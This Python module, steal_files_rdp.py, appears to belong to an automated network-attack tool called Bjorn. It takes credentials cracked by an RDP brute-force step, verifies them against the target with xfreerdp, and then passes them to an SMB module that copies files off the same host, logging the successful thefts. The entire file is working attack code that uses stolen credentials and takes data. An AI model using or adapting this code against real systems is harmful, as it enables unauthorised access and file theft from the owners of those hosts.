"""
steal_files_rdp.py - Verifies RDP credentials (xfreerdp +auth-only) and defers real file
collection to the SMB stealer against the same host.

#12 + #2 + #6: converted to BaseStealer. The old /drive:shared,/mnt/shared path redirected a
*local* directory into the session and could only copy Bjorn's own disk; the
_looks_like_local_root guard still exists as a backstop if anything ever walks a staging
path. True remote→local file transfer over RDP is not implemented; a host with RDP:3389
almost always exposes SMB:445, and the cracked RDP credential is already in the pool for
the SMB action to reuse.
"""

import logging
import os
import shutil
import subprocess

from base_stealer import BaseStealer
from logger import Logger
from shared import SharedData

logger = Logger(name="steal_files_rdp.py", level=logging.DEBUG)

b_class = "StealFilesRDP"
b_module = "steal_files_rdp"
b_status = "steal_files_rdp"
b_parent = "RDPBruteforce"
b_port = 3389

_LOCAL_ROOT_MARKERS = (
    '/home/bjorn',
    '/etc/bjorn',
    '/usr/bin',
    '/lib/modules',
    'version.txt',
    'Bjorn.py',
)


class StealFilesRDP(BaseStealer):
    """Verify RDP credentials; file collection is deferred to SMB (#2)."""

    CRED_FILE_ATTR = "rdpfile"
    LOOT_SUBDIR = "rdp"
    CONNECTED_FLAG = "rdp_connected"
    LOGGER = logger
    ROOT = "/mnt/shared"

    def open_session(self, ip, username, password):
        """Auth-only probe. Returns a truthy token on success (no long-lived session)."""
        if self.shared_data.orchestrator_should_exit:
            raise RuntimeError("orchestrator exit")
        command = [
            "xfreerdp",
            f"/v:{ip}",
            f"/u:{username}",
            f"/p:{password}",
            "/cert:ignore",
            "+auth-only",
        ]
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            try:
                _stdout, stderr = process.communicate(timeout=30)
            except subprocess.TimeoutExpired:
                process.kill()
                process.communicate()
                raise RuntimeError(f"xfreerdp timed out connecting to {ip}")
            if process.returncode != 0:
                err = (stderr or b'').decode(errors='replace')[:300]
                raise RuntimeError(f"RDP auth failed: {err}")
            self.mark_connected()
            logger.info(f"RDP credential verified for {ip} with username {username}")
            return process
        except FileNotFoundError:
            raise RuntimeError("xfreerdp is not installed — cannot verify RDP credentials")

    def close_session(self, conn):
        try:
            if conn is not None and hasattr(conn, 'terminate'):
                conn.terminate()
                conn.wait(timeout=5)
        except Exception:
            pass

    def _looks_like_local_root(self, dir_path):
        try:
            sample = []
            for root, dirs, filenames in os.walk(dir_path):
                sample.extend(os.path.join(root, f) for f in filenames[:20])
                if len(sample) >= 20:
                    break
            joined = ' '.join(sample)
            return any(marker in joined for marker in _LOCAL_ROOT_MARKERS)
        except Exception:
            return False

    def find_files(self, conn, dir_path):
        if not os.path.isdir(dir_path):
            return []
        if self._looks_like_local_root(dir_path):
            logger.error(
                f"Refusing to steal from {dir_path}: it looks like the Pi's own filesystem. "
                "RDP file collection is deferred to SMB (#2)."
            )
            return []
        return []

    def steal_file(self, conn, remote_file, local_dir):
        """Budget-aware local copy if a future transport stages a file under ROOT (#6)."""
        if not self.check_budget(local_dir):
            return
        try:
            size = os.path.getsize(remote_file)
        except OSError:
            size = 0
        if not self.fits_budget(size):
            logger.warning(
                f"Skipping {remote_file}: {size} bytes exceeds per-file or per-run budget")
            return
        try:
            local_file_path = os.path.join(local_dir, os.path.basename(remote_file))
            os.makedirs(os.path.dirname(local_file_path) or local_dir, exist_ok=True)
            shutil.copy2(remote_file, local_file_path)
            self.note_bytes(size)
            logger.success(f"Copied staged file {remote_file} to {local_file_path} ({size} bytes)")
        except Exception as e:
            logger.error(f"Error stealing staged file {remote_file}: {e}")

    def harvest(self, conn, ip, row):
        """Successful RDP auth is the win. File collection is deferred to SMB (#2)."""
        logger.success(
            f"RDP credential verified for {ip}; file collection deferred to SMB stealer")
        try:
            from actions.steal_files_smb import StealFilesSMB
            smb = StealFilesSMB(self.shared_data)
            smb.stop_execution = getattr(self, 'stop_execution', False)
            smb._run_bytes = getattr(self, '_run_bytes', 0)
            creds = smb.load_credentials(ip)
            for username, password in creds[:3]:
                if getattr(self, 'stop_execution', False) or self.shared_data.orchestrator_should_exit:
                    break
                smb_conn = None
                try:
                    smb_conn = smb.open_session(ip, username, password)
                    if smb.harvest(smb_conn, ip, row):
                        self.note_bytes(getattr(smb, '_run_bytes', 0) - getattr(self, '_run_bytes', 0))
                        logger.success(f"RDP→SMB handoff stole files from {ip}")
                        break
                except Exception as e:
                    logger.info(f"RDP→SMB handoff attempt failed for {username}@{ip}: {e}")
                finally:
                    if smb_conn is not None:
                        smb.close_session(smb_conn)
        except Exception as e:
            logger.info(f"RDP→SMB handoff unavailable: {e}")
        return True


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_rdp = StealFilesRDP(shared_data)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
